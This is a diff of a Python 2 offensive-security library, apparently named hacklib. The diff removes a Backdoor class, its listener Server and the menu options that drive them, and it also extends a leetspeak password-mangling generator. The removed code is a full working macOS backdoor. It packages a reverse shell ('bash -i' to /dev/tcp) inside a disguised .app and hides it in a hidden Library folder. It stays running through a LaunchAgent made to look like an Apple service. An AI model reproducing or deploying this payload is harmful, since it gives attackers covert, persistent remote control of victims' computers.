@@ -25,85 +25,6 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Fixes scapy logging
 from scapy.all import * # Required for the Probe Request Class
 from string import ascii_uppercase, ascii_lowercase, digits # Import for PatternCreate and PatternOffset
 
-class Backdoor(object):
-    '''Creates a persistent backdoor payload. Currently only for Mac OSX.
-        Payloads for Windows and Linux coming soon.'''
-
-    def __init__(self):
-        self.IP = ''
-        self.port = ''
-        self.osx_payload = '''#!/bin/bash
-mkdir ~/Library/.h
-echo '#!/bin/bash
-bash -i >& /dev/tcp/HOST/PORT 0>&1
-wait' > ~/Library/.h/connect.sh
-chmod +x ~/Library/.h/connect.sh
-echo '<plist version="1.0">
-<dict>
-<key>Label</key>
-<string>com.apples.services</string>
-<key>ProgramArguments</key>
-<array>
-<string>/bin/sh</string>
-<string>'$HOME'/Library/.h/connect.sh</string>
-</array>
-<key>RunAtLoad</key>
-<true/>
-<key>StartInterval</key>
-<integer>60</integer>
-<key>AbandonProcessGroup</key>
-<true/>
-</dict>
-</plist>' > ~/Library/LaunchAgents/com.apples.services.plist
-chmod 600 ~/Library/LaunchAgents/com.apples.services.plist
-launchctl load ~/Library/LaunchAgents/com.apples.services.plist
-exit
-'''
-
-    def create(self, IP, port, OS, appname = 'funny_cats'):
-        '''Creates a user-level reverse shell.'''
-        
-        if OS == 'OSX':
-            self.osx_payload = self.osx_payload.replace('HOST', IP).replace('PORT', str(port))
-            try:
-                os.makedirs(os.getcwd() + '/' + appname + '.app/Contents/MacOS')
-            except: pass
-            payload_path = os.getcwd() + '/' + appname + '.app/Contents/MacOS/' + appname
-            with open(payload_path, 'w') as f:
-                f.write(self.osx_payload)
-            import subprocess
-            subprocess.Popen(['chmod', '755', payload_path])
-            print 'Payload saved to ' + os.getcwd() + '/' + appname + '.app'
-
-class Server(object):
-
-    def __init__(self, port):
-        import socket
-        self.port = port
-        self.address = (socket.gethostname(), port)
-
-    def listen(self):
-        import time
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.bind(self.address)
-        sock.listen(1)
-        while True:
-            connection, cAddress = sock.accept()
-            try:
-                print 'New connection', cAddress
-                connection.sendall('whoami\n')
-                while True:
-                    data = connection.recv(32768)
-                    if data:
-                        print '\n'.join(data.split('\n')[:-1])
-                        response = raw_input(data.split('\n')[-1])
-                        data = None
-                    if response:
-                        connection.sendall(response + '\n')
-                        time.sleep(0.5)
-            finally:
-                connection.close()
-                
 class FTPAuth(object):
     '''FTP login and command handler.
     Commands:
@@ -528,9 +449,9 @@ def getProxies(country_filter = 'ALL', proxy_type = ('Socks4', 'Socks5')):
     proxy_type: Specify whic Socks version to use, e.g. 'Socks5'
     '''
     try: import mechanize
-    except: raise MissingPackageException('Please install the mechanize module before continuing. Use hacklib.installDependencies()')
+    except: raise MissingPackageException('Please install the mechanize module before continuing.')
     try: from bs4 import BeautifulSoup
-    except: raise MissingPackageException('Please install the beautifulsoup4 module before continuing. Use hacklib.installDependencies()')
+    except: raise MissingPackageException('Please install the beautifulsoup4 module before continuing.')
     br = mechanize.Browser()
     br.set_handle_robots(False)
     br.addheaders = [('User-agent', 'googlebot')]
@@ -560,18 +481,6 @@ def getProxies(country_filter = 'ALL', proxy_type = ('Socks4', 'Socks5')):
                 if proxy[4] in proxy_type: filteredlist.append(proxy)
         proxylist = filteredlist
     return proxylist
-
-def installDependencies():
-    import subprocess
-    try:
-        mech = subprocess.check_output(['/usr/local/bin/pip', 'install', 'mechanize'])
-        if 'successfully installed' in mech: print 'Installed mechanize'
-        beaut = subprocess.check_output(['/usr/local/bin/pip', 'install', 'bs4'])
-        if 'successfully installed' in beaut: print 'Installed beautifulsoup'
-        scapy = subprocess.check_output(['/usr/local/bin/pip', 'install', 'scapy'])
-        if 'successfully installed' in beaut: print 'Installed scapy'
-    except:
-        raise MissingPipException('Could not find pip.')
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 def send(IP, port, message, keepalive = False):
@@ -727,27 +636,6 @@ def uiLanScan():
         print ip
     print 'Lan scan complete.'
     time.sleep(2)
-
-def uiCreateBackdoor():
-    print ''
-    print 'Select OS'
-    print '1) Mac OSX'
-    ink = _Getch()
-    cmd = ink()
-    if cmd == '1':
-        ip = raw_input('Listener IP > ')
-        port = raw_input('Listener Port > ')
-        appname = raw_input('Filename > ')
-        bd = Backdoor()
-        bd.create(ip, port, 'OSX', appname)
-        time.sleep(2)
-
-def uiServer():
-    print ''
-    port = raw_input('Listening port > ')
-    s = Server(int(port))
-    print 'Listening on port ' + port
-    s.listen()
     
 def userInterface():
     '''Start UI if hacklib isn't being used as a library.
@@ -764,12 +652,10 @@ def userInterface():
         print '1) Connect to a proxy'
         print '2) Target an IP or URL'
         print '3) Lan Scan'
-        print '4) Create Backdoor'
-        print '5) Server'
-        print '6) Exit'
+        print '4) Exit'
         ink = _Getch()
         cmd = ink()
-        if cmd == '6':
+        if cmd == '4':
             return
         if cmd == '2':
             address = raw_input('Input IP or URL > ')
@@ -792,12 +678,6 @@ def userInterface():
 
         if cmd == '3':
             uiLanScan()
-
-        if cmd == '4':
-            uiCreateBackdoor()
-
-        if cmd == '5':
-            uiServer()
             
         if cmd == '1':
             print 'Would you like to automatically find a proxy or input one manually?'
@@ -843,10 +723,10 @@ class Mangle:
 
     def __init__(self, text, num1, num2, year1, year2):
 
-        self.num1 = num1
-        self.num2 = num2
-        self.year1 = year1
-        self.year2 = year2
+        self.num1 = num1 
+        self.num2 = num2 + 1
+        self.year1 = year1 
+        self.year2 = year2 + 1
         self.text = text
 
 
@@ -925,14 +805,14 @@ class Mangle:
     def Leet(self):
 
         for x in self.text.split():
-            print x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")
+            print x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8").replace("s", "$").replace("S", "$")
 
 
 
     def LeetCap(self):
 
         for x in self.text.split():
-            print x.capitalize().replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")
+            print x.capitalize().replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8").replace("s", "$").replace("S", "$")
 
 
 
@@ -942,8 +822,8 @@ class Mangle:
 
             for i in range(self.year1, self.year2):
 
-                print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"), i)
-                print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"))
+                print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8").replace("s", "$").replace("S", "$"), i)
+                print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8").replace("s", "$").replace("S", "$"))
 
 
     def LeetNumbers(self):
@@ -952,15 +832,15 @@ class Mangle:
 
             for i in range(self.num1, self.num2):
 
-                print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"), i)
-                print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"))
+                print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8").replace("s", "$").replace("S", "$"), i)
+                print ("%s" + "%s") % (i, x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8").replace("s", "$").replace("S", "$"))
 
 
     def UniqueLeet(self):
 
         for x in self.text.split():
 
-            print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"),(x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8")))
+            print ("%s" + "%s") % (x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8"),(x.replace("e", "3").replace("i", "1").replace("O", "0").replace("I", "1").replace("E", "3").replace("o", "0").replace("l", "1").replace("L", "1").replace("g", "9").replace("G", "6").replace("b", "8").replace("B", "8").replace("s", "$").replace("S", "$")))
 
 
 
@@ -1150,6 +1030,3 @@ if __name__ == '__main__':
 
 class MissingPackageException(Exception):
     '''Raise when 3rd party modules are not able to be imported.'''
-
-class MissingPipexception(Exception):
-    '''Raise when pip is not able to be found'''
